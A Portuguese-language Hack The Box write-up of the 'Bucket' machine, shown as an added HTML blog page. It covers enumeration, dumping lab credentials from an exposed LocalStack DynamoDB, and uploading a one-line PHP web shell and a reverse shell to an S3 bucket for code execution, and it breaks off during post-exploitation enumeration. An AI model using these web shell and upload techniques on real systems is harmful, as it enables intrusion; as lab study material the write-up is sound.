@@ -1,0 +1,1500 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.21.0 by Michael Rose
+  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>Hackthebox write-up: Bucket | Davi Cruz</title>
+<meta name="description" content="Olá pessoal!  A máquina desta semana será Bucket, outra máquina classificada como mediana do Hack The Box, criada por MrR3boot.">
+
+
+  <meta name="author" content="Davi Cruz">
+  
+  <meta property="article:author" content="Davi Cruz">
+  
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="Davi Cruz">
+<meta property="og:title" content="Hackthebox write-up: Bucket">
+<meta property="og:url" content="https://davicruz.com/writeup/2021/04/htb-bucket/">
+
+
+  <meta property="og:description" content="Olá pessoal!  A máquina desta semana será Bucket, outra máquina classificada como mediana do Hack The Box, criada por MrR3boot.">
+
+
+
+  <meta property="og:image" content="https://i.imgur.com/m7oESPT.png">
+
+
+
+  <meta name="twitter:site" content="@zerahzurc">
+  <meta name="twitter:title" content="Hackthebox write-up: Bucket">
+  <meta name="twitter:description" content="Olá pessoal!  A máquina desta semana será Bucket, outra máquina classificada como mediana do Hack The Box, criada por MrR3boot.">
+  <meta name="twitter:domain" content="davicruz.com">
+  <meta name="twitter:url" content="https://davicruz.com/writeup/2021/04/htb-bucket/">
+
+  
+    <meta name="twitter:card" content="summary">
+    
+      <meta name="twitter:image" content="https://i.imgur.com/m7oESPT.png">
+    
+  
+
+  
+
+
+
+  <meta property="article:published_time" content="2021-04-24T09:00:00-03:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="https://davicruz.com/writeup/2021/04/htb-bucket/">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": "Davi Cruz",
+      "url": "https://davicruz.com/",
+      "sameAs": ["https://twitter.com/zerahzurc","https://www.linkedin.com/in/davicruz","https://github.com/davi-cruz"]
+    
+  }
+</script>
+
+
+  <meta name="google-site-verification" content="hrWV-PqvbpxEy2HdpVYFQNws2Sz_tROleVyF18s2kWA" />
+
+
+  <meta name="msvalidate.01" content="60B1FA6CDAF15D226AB529AF30386BD8">
+
+
+
+  <meta name="yandex-verification" content="08de8d8c0326420f">
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Davi Cruz Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css">
+
+<!--[if IE]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+<!-- Favicon -->
+<link rel="shortcut icon" href="/assets/images/favicon.ico" />
+
+<!-- Multilang tags -->
+
+    
+<link rel="alternate" hreflang="pt-BR" href="/writeup/2021/04/htb-bucket/">
+    
+
+    
+<link rel="alternate" hreflang="en-US" href="/en-US/writeup/2021/04/htb-bucket/">
+    
+
+
+<!-- Cookie Consent - Osano -->
+<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/cookieconsent@3/build/cookieconsent.min.css" />
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+    <nav class="skip-links">
+  <h2 class="screen-reader-text">Skip links</h2>
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          
+          <a class="site-logo" href="https://davicruz.com"><img src="/assets/images/logo.png" alt="Davi Cruz"></a>
+          
+          <a class="site-title" href="https://davicruz.com">
+            Davi Cruz
+            
+          </a>
+        
+        <ul class="visible-links">
+<li class="masthead__menu-item">
+            <a href="/categorias/">Categorias</a>
+          </li>
+<li class="masthead__menu-item">
+            <a href="/tags/">Tags</a>
+          </li>
+<li class="masthead__menu-item">
+            <a href="/sobre/">Sobre</a>
+          </li>
+</ul>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Buscar</span>
+          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 15.99 16">
+            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
+          </svg>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+        <img src="/assets/images/bio-photo.jpg" alt="Davi Cruz" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">Davi Cruz</h3>
+    
+    
+      <div class="author__bio" itemprop="description">
+        <p>Apenas mais um profissional de Cibersegurança</p>
+
+      </div>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Acompanhe no</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">São Paulo, BR</span>
+        </li>
+      
+
+      
+        
+          
+            <li><a href="https://linkedin.com/in/davicruz" rel="nofollow noopener noreferrer"><i class="fab fa-fw fab fa-linkedin" aria-hidden="true"></i><span class="label">Linkedin</span></a></li>
+          
+        
+          
+            <li><a href="https://twitter.com/zerahzurc" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
+          
+        
+          
+            <li><a href="https://github.com/davi-cruz" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
+          
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+<li>
+  <strong></strong>
+  
+  <a class="link-en" href=""></a>
+  
+</li>
+
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Hackthebox write-up: Bucket">
+    <meta itemprop="description" content="Olá pessoal!A máquina desta semana será Bucket, outra máquina classificada como mediana do Hack The Box, criada por MrR3boot.">
+    <meta itemprop="datePublished" content="2021-04-24T09:00:00-03:00">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Hackthebox write-up: Bucket
+</h1>
+          
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-calendar-alt" aria-hidden="true"></i>
+        <time datetime="2021-04-24T09:00:00-03:00">April 24, 2021</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          13 minuto(s) de leitura
+        
+      </span>
+    
+
+
+      <!-- Start Read in other languages-->
+        <span class="page__meta-sep page__meta-lang"></span>
+        
+        
+        
+        
+        
+        <span class="page__meta-lang"><a href="/en-US/writeup/2021/04/htb-bucket/">Read also in  <img class="emoji" title=":us:" alt=":us:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f1fa-1f1f8.png" height="20" width="20"></a></span>
+        
+
+        
+
+        
+
+        
+        
+      <!-- End Read in other languages-->
+      <span class="page__meta-sep page__meta-share"></span>
+      <span class="page__meta-share">
+        <i class="fas fa-share-alt" aria-hidden="true"></i>
+        <a href="#sharelinks">Compartilhar</a>
+      </span>
+  </p>
+
+
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p>Olá pessoal!</p>
+
+<p>A máquina desta semana será <strong>Bucket</strong>, outra máquina classificada como mediana do <a href="https://www.hackthebox.eu/">Hack The Box</a>, criada por <a href="https://app.hackthebox.eu/users/13531">MrR3boot</a>. <!--more--></p>
+
+<p class="notice--info"><img class="emoji" title=":information_source:" alt=":information_source:" src="https://github.githubassets.com/images/icons/emoji/unicode/2139.png" height="20" width="20"> <strong>Info</strong>: Write-ups para máquinas do Hack The Box são postados assim que as respectivas máquinas são aposentadas.</p>
+
+<p><img src="https://i.imgur.com/Qp79TCm.png" alt="HTB Bucket" class="align-center"></p>
+
+<p>Particularmente achei essa máquina bem legal, onde tive a oportunidade de “brincar” um pouco com os serviços de armazenamento da AWS, mesmo que em uma instância local para desenvolvedores.</p>
+
+<p>A sua resolução esteve bastante ligada a este serviço onde tivemos que identificar uma forma de incluir um arquivo no site publicado para obter um shell reverso, obter a flag de user com credenciais existentes no DynamoDB.</p>
+
+<p>O flag de root foi obtido após abuso de uma aplicação ainda em desenvolvimento, onde utilizamos uma vulnerabilidade de LFI para obter a chave do <code class="language-plaintext highlighter-rouge">id_rsa</code> e assim obter acesso interativo com esta conta.</p>
+
+<h2 id="enumeração">Enumeração</h2>
+
+<p>Como de costume, iniciamos com a enumeração rápida do <code class="language-plaintext highlighter-rouge">nmap</code> para identificar os serviços publicados nesta máquina:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-Pn</span> <span class="nt">-oA</span> quick 10.10.10.212
+Nmap 7.91 scan initiated Fri Feb 26 08:16:37 2021 as: nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-Pn</span> <span class="nt">-oA</span> quick 10.10.10.212
+Nmap scan report <span class="k">for </span>10.10.10.212
+Host is up <span class="o">(</span>0.077s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae <span class="o">(</span>RSA<span class="o">)</span>
+|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.4.41
+|_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Did not follow redirect to http://bucket.htb/
+Service Info: Host: 127.0.1.1<span class="p">;</span> OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+<span class="c"># Nmap done at Fri Feb 26 08:16:48 2021 -- 1 IP address (1 host up) scanned in 10.55 seconds</span>
+</code></pre></div></div>
+
+<h3 id="80tcp---serviço-http">80/TCP - Serviço HTTP</h3>
+
+<p>Uma vez que notei um redirect para <code class="language-plaintext highlighter-rouge">bucket.htb</code>, incluí a entrada no arquivo hosts apontando para o endereço IP da máquina.</p>
+
+<p>Ao acessar o site, notei que diversas imagens não foram carregadas adequadamente, as quais apontavam para <code class="language-plaintext highlighter-rouge">s3.bucket.htb</code>, vide chamada <code class="language-plaintext highlighter-rouge">curl</code> abaixo. Após incluir também esta entrada no arquivo hosts, o carregamento da página ocorreu com sucesso.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl <span class="nt">-L</span> http://bucket.htb | <span class="nb">grep</span> <span class="nt">-Eo</span> <span class="s1">'href=".*"|src=".*"'</span> | <span class="nb">sort</span> <span class="nt">-u</span>
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  5344  100  5344    0     0  33822      0 <span class="nt">--</span>:--:-- <span class="nt">--</span>:--:-- <span class="nt">--</span>:--:-- 33822
+<span class="nv">href</span><span class="o">=</span><span class="s2">"#"</span>
+<span class="nv">href</span><span class="o">=</span><span class="s2">"#"</span><span class="o">&gt;</span>&lt;i <span class="nv">class</span><span class="o">=</span><span class="s2">"fab fa-facebook-square"</span>
+<span class="nv">href</span><span class="o">=</span><span class="s2">"#"</span><span class="o">&gt;</span>&lt;i <span class="nv">class</span><span class="o">=</span><span class="s2">"fab fa-instagram"</span>
+<span class="nv">href</span><span class="o">=</span><span class="s2">"#"</span><span class="o">&gt;</span>&lt;i <span class="nv">class</span><span class="o">=</span><span class="s2">"fab fa-linkedin"</span>
+<span class="nv">href</span><span class="o">=</span><span class="s2">"#"</span><span class="o">&gt;</span>&lt;i <span class="nv">class</span><span class="o">=</span><span class="s2">"fab fa-twitter"</span>
+<span class="nv">src</span><span class="o">=</span><span class="s2">"http://s3.bucket.htb/adserver/images/bug.jpg"</span> <span class="nv">alt</span><span class="o">=</span><span class="s2">"Bug"</span> <span class="nv">height</span><span class="o">=</span><span class="s2">"160"</span> <span class="nv">width</span><span class="o">=</span><span class="s2">"160"</span>
+<span class="nv">src</span><span class="o">=</span><span class="s2">"http://s3.bucket.htb/adserver/images/cloud.png"</span> <span class="nv">alt</span><span class="o">=</span><span class="s2">"cheer"</span> <span class="nv">height</span><span class="o">=</span><span class="s2">"160"</span> <span class="nv">width</span><span class="o">=</span><span class="s2">"160"</span>
+<span class="nv">src</span><span class="o">=</span><span class="s2">"http://s3.bucket.htb/adserver/images/malware.png"</span> <span class="nv">alt</span><span class="o">=</span><span class="s2">"Malware"</span> <span class="nv">height</span><span class="o">=</span><span class="s2">"160"</span> <span class="nv">width</span><span class="o">=</span><span class="s2">"160"</span>
+</code></pre></div></div>
+
+<h4 id="s3buckethtb"><code class="language-plaintext highlighter-rouge">s3.bucket.htb</code></h4>
+
+<p>Ao identificar o DNS <code class="language-plaintext highlighter-rouge">s3.bucket.htb</code> me chamou atenção para o nome, o qual faz referência ao serviço <a href="https://aws.amazon.com/s3">Amazon S3</a>, que provê armazenamento de arquivos no formato blob em nuvem.</p>
+
+<p>Analisando o webserver da requisição para uma das URLs de imagem, notei que se utiliza de outro webserver (<code class="language-plaintext highlighter-rouge">hypercorn-h11</code>), diferente do Apache listado no Scan do NMAP para a página na URL <code class="language-plaintext highlighter-rouge">bucket.htb</code>, o que significa que temos outro serviço na máquina ou há algum tipo de proxy na requisição neste virtual host.</p>
+
+<p>Para validar o que temos nesta estrutura, realizei uma enumeração utilizando o <code class="language-plaintext highlighter-rouge">gobuster</code> e encontrei dois diretórios interessantes: <em>health</em> e <em>shell</em></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="nt">-u</span> http://s3.bucket.htb <span class="nt">-o</span> gobuster-s3.txt
+<span class="o">===============================================================</span>
+Gobuster v3.0.1
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@_FireFart_<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+] Url:            http://s3.bucket.htb
+<span class="o">[</span>+] Threads:        10
+<span class="o">[</span>+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+<span class="o">[</span>+] Status codes:   200,204,301,302,307,401,403
+<span class="o">[</span>+] User Agent:     gobuster/3.0.1
+<span class="o">[</span>+] Timeout:        10s
+<span class="o">===============================================================</span>
+2021/02/26 09:42:22 Starting gobuster
+<span class="o">===============================================================</span>
+/health <span class="o">(</span>Status: 200<span class="o">)</span>
+/shell <span class="o">(</span>Status: 200<span class="o">)</span>
+Progress: 2643 / 220561 <span class="o">(</span>1.20%<span class="o">)</span>
+</code></pre></div></div>
+
+<p>É importante mencionar que são diretórios, pois o resultado para as chamadas em cada um dos nomes via <code class="language-plaintext highlighter-rouge">curl</code> com ou sem a barra ao final é diferente, conforme podemos ver abaixo:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl <span class="nt">-L</span> http://s3.bucket.htb/health                                                                       
+<span class="o">{</span><span class="s2">"services"</span>: <span class="o">{</span><span class="s2">"s3"</span>: <span class="s2">"running"</span>, <span class="s2">"dynamodb"</span>: <span class="s2">"running"</span><span class="o">}}</span>
+
+<span class="nv">$ </span>curl <span class="nt">-L</span> http://s3.bucket.htb/health/
+<span class="o">{</span><span class="s2">"status"</span>: <span class="s2">"running"</span><span class="o">}</span>                                                                                                 
+<span class="nv">$ </span>curl <span class="nt">-L</span> http://s3.bucket.htb/shell
+
+
+<span class="nv">$ </span>curl <span class="nt">-L</span> http://s3.bucket.htb/shell/
+&lt;<span class="o">!</span>DOCTYPE html&gt;
+&lt;html itemscope <span class="nv">itemtype</span><span class="o">=</span><span class="s2">"http://schema.org/Product"</span><span class="o">&gt;</span>
+  &lt;<span class="nb">head</span><span class="o">&gt;</span>
+    &lt;title&gt;AWS Console&lt;/title&gt;
+    &lt;meta <span class="nv">charset</span><span class="o">=</span><span class="s2">"UTF-8"</span><span class="o">&gt;</span>
+
+    &lt;<span class="o">!</span><span class="nt">--</span> Application <span class="nt">--</span><span class="o">&gt;</span>
+<span class="o">[</span>...]
+</code></pre></div></div>
+
+<p>Como a última chamada (<code class="language-plaintext highlighter-rouge">curl -L http://s3.bucket.htb/shell/</code>) retornou o conteúdo de uma página HTML, refiz a requisição no navegador e notei que estava acessando à página do <strong>DynamoDB Web Shell</strong>.</p>
+
+<p>Pesquisando um pouco pude chegar à conclusão de que estávamos utilizando um emulador de storage da AWS, possivelmente uma instancia do <a href="https://github.com/localstack/localstack">Localstack</a>, muito popular entre desenvolvedores.</p>
+
+<p><img src="https://i.imgur.com/6J27Miv.png" alt="DynamoDB Web Shell - Bucket HTB" class="align-center"></p>
+
+<p>Brincando com alguns dos exemplos da página, consegui listar algumas informações da instancia (ListTables e DescribeTable), conforme abaixo, onde podemos listar algumas informações como a região do serviço (<code class="language-plaintext highlighter-rouge">us-east-1</code>) e uma tabela chamada <code class="language-plaintext highlighter-rouge">users</code> no DynamoDB, assim como o seu respectivo resource name <code class="language-plaintext highlighter-rouge">arn:aws:dynamodb:us-east-1:000000000000:table/users</code>.</p>
+
+<p><img src="https://i.imgur.com/cKIzAtd.png" alt="DynamoDB Web Shell - List - Bucket HTB" class="align-center"></p>
+
+<p>Considerando que estamos falando de uma instância do LocalStack, descobri que é possível utilizar o <a href="https://aws.amazon.com/cli">awscli</a>, utilitário de linha de comando da AWS, para se conectar à esta instância local, conforme post <a href="https://reflectoring.io/aws-localstack/">Local Development with AWS on LocalStack (reflectoring.io)</a>.</p>
+
+<p>Como o <code class="language-plaintext highlighter-rouge">awscli</code> é mais flexível para enumerar e trabalhar com os recursos do que o DynamoDB Web Shell, segui para a instalação via <code class="language-plaintext highlighter-rouge">apt</code> e sua conexão utilizando as informações obtidas no post acima citado, o qual foi executado conforme abaixo. Para as credenciais, quaisquer valores são válidos, uma vez que não se trata de uma instância real em execução na AWS.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Install aws cli</span>
+<span class="nv">$ </span><span class="nb">sudo </span>apt <span class="nb">install </span>awscli <span class="nt">-y</span>
+<span class="o">[</span>...]
+<span class="nv">$ </span>aws configure <span class="nt">--profile</span> bucket.htb                                                                         
+AWS Access Key ID <span class="o">[</span>None]: dummy
+AWS Secret Access Key <span class="o">[</span>None]: dummy
+Default region name <span class="o">[</span>None]: us-east-1
+Default output format <span class="o">[</span>None]:
+</code></pre></div></div>
+
+<p>Lendo a documentação do <code class="language-plaintext highlighter-rouge">awscli</code> para o DynamoDB, executei algumas consultas simples para listar as tabelas e entradas existentes, conforme abaixo, onde pude obter alguns usuários e senhas que poderão ser úteis futuramente.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>aws dynamodb list-tables <span class="se">\</span>
+    <span class="nt">--endpoint-url</span> http://s3.bucket.htb <span class="se">\</span>
+    <span class="nt">--profile</span> bucket.htb <span class="se">\</span>
+    <span class="nt">--output</span> json
+<span class="o">{</span>
+  <span class="s2">"TableNames"</span>: <span class="o">[</span>
+    <span class="s2">"users"</span>
+  <span class="o">]</span>
+<span class="o">}</span>
+
+<span class="nv">$ </span>aws dynamodb scan <span class="se">\</span>
+    <span class="nt">--table-name</span> <span class="nb">users</span> <span class="se">\</span>
+    <span class="nt">--endpoint-url</span> http://s3.bucket.htb <span class="se">\</span>
+    <span class="nt">--profile</span> bucket.htb <span class="se">\</span>
+    <span class="nt">--output</span> json
+<span class="o">{</span>
+  <span class="s2">"Items"</span>: <span class="o">[</span>
+    <span class="o">{</span>
+      <span class="s2">"password"</span>: <span class="o">{</span>
+        <span class="s2">"S"</span>: <span class="s2">"Management@#1@#"</span>
+      <span class="o">}</span>,
+      <span class="s2">"username"</span>: <span class="o">{</span>
+        <span class="s2">"S"</span>: <span class="s2">"Mgmt"</span>
+      <span class="o">}</span>
+    <span class="o">}</span>,
+    <span class="o">{</span>
+      <span class="s2">"password"</span>: <span class="o">{</span>
+        <span class="s2">"S"</span>: <span class="s2">"Welcome123!"</span>
+      <span class="o">}</span>,
+      <span class="s2">"username"</span>: <span class="o">{</span>
+        <span class="s2">"S"</span>: <span class="s2">"Cloudadm"</span>
+      <span class="o">}</span>
+    <span class="o">}</span>,
+    <span class="o">{</span>
+      <span class="s2">"password"</span>: <span class="o">{</span>
+        <span class="s2">"S"</span>: <span class="s2">"n2vM-&lt;_K_Q:.Aa2"</span>
+      <span class="o">}</span>,
+      <span class="s2">"username"</span>: <span class="o">{</span>
+        <span class="s2">"S"</span>: <span class="s2">"Sysadm"</span>
+      <span class="o">}</span>
+    <span class="o">}</span>
+  <span class="o">]</span>,
+  <span class="s2">"Count"</span>: 3,
+  <span class="s2">"ScannedCount"</span>: 3,
+  <span class="s2">"ConsumedCapacity"</span>: null
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p>Como sabemos que temos um <strong>s3</strong> também em execução, enumerei algumas informações sobre os containers blob existentes, onde foi encontrado o <code class="language-plaintext highlighter-rouge">adserver</code> (o que já tínhamos uma ideia por conta da URL das imagens conforme previamente enumerado) e confirmamos qual o conteúdo deste bucket.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>aws s3 <span class="nb">ls</span> <span class="se">\</span>
+    <span class="nt">--endpoint-url</span> http://s3.bucket.htb <span class="se">\</span>
+    <span class="nt">--profile</span> bucket.htb
+2021-02-26 11:48:02 adserver
+
+<span class="nv">$ </span>aws s3 <span class="nb">ls </span>s3://adserver <span class="se">\</span>
+    <span class="nt">--endpoint-url</span> http://s3.bucket.htb <span class="se">\</span>
+    <span class="nt">--profile</span> bucket.htb
+                           PRE images/
+2021-02-26 11:50:04       5344 index.html
+
+<span class="nv">$ </span>aws s3 <span class="nb">ls </span>s3://adserver/images/ <span class="se">\</span>
+    <span class="nt">--endpoint-url</span> http://s3.bucket.htb <span class="se">\</span>
+    <span class="nt">--profile</span> bucket.htb
+2021-02-26 11:52:02      37840 bug.jpg
+2021-02-26 11:52:02      51485 cloud.png
+2021-02-26 11:52:02      16486 malware.png
+</code></pre></div></div>
+
+<h2 id="acesso-inicial">Acesso inicial</h2>
+
+<p>Uma vez que temos acesso ao blob s3 e sabemos quais conteúdos disponíveis e como utilizá-lo, a primeira coisa a se fazer é realizar o upload de um arquivo para shell reverso. Em primeiro momento vamos validar a possibilidade de utilizar php com um webshell simples conforme abaixo:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">]);</span> <span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>Após a criação do arquivo, realizado o upload via CLI vide comandos abaixo:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>aws s3 <span class="nb">cp</span> ./exploit.php s3://adserver/ <span class="se">\</span>
+    <span class="nt">--endpoint-url</span> http://s3.bucket.htb <span class="se">\</span>
+    <span class="nt">--profile</span> bucket.htb
+upload: ./exploit.php to s3://adserver/exploit.php                
+
+<span class="nv">$ </span>aws s3 <span class="nt">--endpoint-url</span> http://s3.bucket.htb <span class="nt">--profile</span> bucket.htb <span class="nb">ls </span>s3://adserver/              
+                           PRE images/
+2021-02-26 11:56:28         31 exploit.php
+2021-02-26 11:56:02       5344 index.html
+</code></pre></div></div>
+
+<p>Ao tentar acessá-lo alguns instantes depois, notei que o arquivo que enviei foi removido por outro processo. Para tentar contornar a questão, configurei para que a chamada de execução de comando fosse realizada assim que o upload fosse finalizado, executando o comando <code class="language-plaintext highlighter-rouge">id</code>, onde pudemos confirmar o sucesso na tarefa realizada.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>aws s3 <span class="nb">cp</span> ./exploit.php s3://adserver/ <span class="se">\</span>
+    <span class="nt">--endpoint-url</span> http://s3.bucket.htb <span class="nt">--profile</span> bucket.htb <span class="o">&amp;&amp;</span> curl <span class="nt">-L</span> http://bucket.htb/exploit.php?cmd<span class="o">=</span><span class="nb">id
+</span>upload: ./exploit.php to s3://adserver/exploit.php                
+<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Para um shell reverso, alterei o arquivo a ser enviado de <code class="language-plaintext highlighter-rouge">exploit.php</code> pelo <a href="https://github.com/pentestmonkey/php-reverse-shell">pentestmonkey/php-reverse-shell (github.com)</a> que já iniciaria a conexão reversa a um listener previamente definido, sem a necessidade de enviar parâmetros no payload, o qual tivemos sucesso após algumas tentativas.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aws s3 <span class="nt">--endpoint-url</span> http://s3.bucket.htb <span class="nt">--profile</span> bucket.htb <span class="nb">cp</span> ./exploit.php s3://adserver/ <span class="o">&amp;&amp;</span> curl <span class="nt">-L</span> http://bucket.htb/exploit.php
+</code></pre></div></div>
+
+<h2 id="user-flag">User flag</h2>
+
+<p>Uma vez com acesso ao shell da máquina, executei o <code class="language-plaintext highlighter-rouge">linpeas.sh</code> para simplificar a enumeração, onde os seguintes itens foram identificados:</p>
+
+<ul>
+  <li>
+    <p>Usuário local <code class="language-plaintext highlighter-rouge">roy</code> possui acesso à máquina e, enumerando seu diretório observado a existencia do arquivo <code class="language-plaintext highlighter-rouge">user.txt</code>, o qual não temos acesso leitura com a conta <code class="language-plaintext highlighter-rouge">www-data</code> além de uma pasta <code class="language-plaintext highlighter-rouge">project</code> a ser inspecionada.</p>
+
+    <ul>
+      <li>Este usuário não possui nenhum processo em execução que eventualmente permita a exploração logo precisaremos obter suas credenciais de alguma forma.</li>
+    </ul>
+  </li>
+  <li>
+    <p>Alguns outros serviços encontram-se em execução nesta máquina, funcionando nas portas 4566, 8000 e 38443, que possivelmente venham a dar privilégios a outras atividades em um segundo momento.</p>
+
+    <div class="language-plaintext highlighter-rouge">
+<div class="highlight"><pre class="highlight"><code>[+] Active Ports                                                                                         
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports                               
+Active Internet connections (servers and established)                                                     
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name         
+tcp        0      0 127.0.0.1:38443         0.0.0.0:*               LISTEN      -                        
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                         
